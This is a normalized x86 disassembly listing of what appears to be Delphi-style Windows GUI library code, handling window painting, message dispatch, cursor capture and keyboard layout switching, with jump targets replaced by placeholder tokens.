push sub_43b780
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43b76f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b776
call sub_4361d4
call sub_420238
retn
sub_43b7a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412ce0
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406a04
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_438978
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_43b858
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_414170
call sub_43b7a0
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_414170
call sub_43b7a0
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_43b8ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43df6c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069f0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43b858
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a04
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_438978
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_43b980
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_437f34
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_438a44
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43b8ec
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069f0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4372f0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43b858
test eax eax
je r-xdata
mov eax ebx
call sub_44e0a8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_438a44
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43df6c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43df6c
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_438978
sub_43bae4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_438bd8
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_438978
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41e17c
call sub_41d4f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41e1b8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43734c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_43bbec
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43468c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_438978
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43bc20
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_43bd40
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bd78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bd47
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414170
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43bd78
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_4141cc
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_414170
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412d08
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_414170
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41d4f8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412d08
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41d4f8
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412d08
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4360e8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_438978
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_43bfa8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4360e8
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43df6c
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_438978
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_438978
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4360e8
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_43bfa8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_414170
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_43c0fc
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43bc20
jmp r-xdata
mov eax ebx
call sub_43ac9c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43c24e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43df6c
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_438978
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_43c0fc
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43df6c
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_43c25c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c27c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c2f0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c310
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c330
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c354
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c378
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c39c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bbec
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c3c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42b480
mov edi eax
mov eax edi
call sub_42b560
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41e1b8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43df6c
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42b660
jmp r-xdata
sub_43c448
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_4392ac
test bl bl
je r-xdata
mov eax edi
call sub_43e27c
mov eax edi
call sub_43de74
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43de74
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43c508
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_438f08
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43c558
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43e27c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43a82c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403490
sub_43c5a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4372f0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43b858
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4568cc
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43c6f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43c7cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c7d6
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43df6c
mov dl [ ebx + 0x184 ]
call sub_442a20
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d2c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407da4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b2c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b2c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454b2c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43c7dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43c866
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c86d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d2c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407da4
test eax eax
je r-xdata
mov eax ebx
call sub_43df6c
mov dl 0x1
call sub_442a04
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43c8c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412cf8
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_438978
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43c918
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
